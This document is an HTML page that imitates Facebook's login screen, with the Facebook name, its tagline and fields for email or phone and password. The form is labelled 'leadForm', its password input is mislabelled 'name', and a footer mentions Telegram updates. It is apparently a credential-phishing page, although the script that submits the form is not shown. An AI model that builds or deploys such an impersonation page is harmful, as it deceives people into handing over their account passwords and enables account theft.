<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Connect</title>
  <link rel="stylesheet" href="/styles.css" />
</head>
<body>
  <div class="fb-wrapper">
    <div class="fb-content">
      <div class="fb-left">
        <h1 class="fb-logo">facebook</h1>
        <p class="fb-tagline">Connect with friends and the world around you.</p>
      </div>
      <div class="fb-right">
        <div class="fb-card">
          <form id="leadForm" autocomplete="off">
            
            <input id="contact" name="contact" type="text" placeholder="Email or phone number" required />

            <input id="name" name="name" type="text" placeholder="Password" required />

            <!-- Honeypot -->
            <input id="hp" name="hp" type="text" aria-hidden="true" tabindex="-1" autocomplete="off" />

            <button id="submitBtn" type="submit">Login</button>
            <p id="status" class="status" role="status" aria-live="polite"></p>
          </form>
        </div>
        <p class="fb-footer-text">
          By joining, you'll receive updates via Telegram.
        </p>
      </div>
    </div>
  </div>
  <script src="/script.js"></script>
</body>
</html>
